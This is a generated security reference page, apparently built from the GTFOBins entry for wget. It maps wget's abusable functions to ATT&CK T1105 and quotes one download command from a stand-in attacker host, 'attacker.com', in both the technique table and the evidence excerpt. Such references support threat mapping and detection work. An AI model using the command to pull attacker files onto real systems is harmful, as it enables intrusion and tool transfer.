---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# wget

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `wget` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for wget covering download, file-read, file-write, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/wget.md)
- Source verification: [source record](../../sources/gtfobins/wget.md)

## Aliases

- `wget`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: wget http://attacker.com/path/to/input-file -O /path/to/output-file |

## Source Verification

[source record](../../sources/gtfobins/wget.md)

## Evidence Excerpt

```text
_body: ''
_name: wget
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/wget
functions:
download:
- code: wget http://attacker.com/path/to/input-file -O /path/to/output-file
contexts:
sudo: null
```
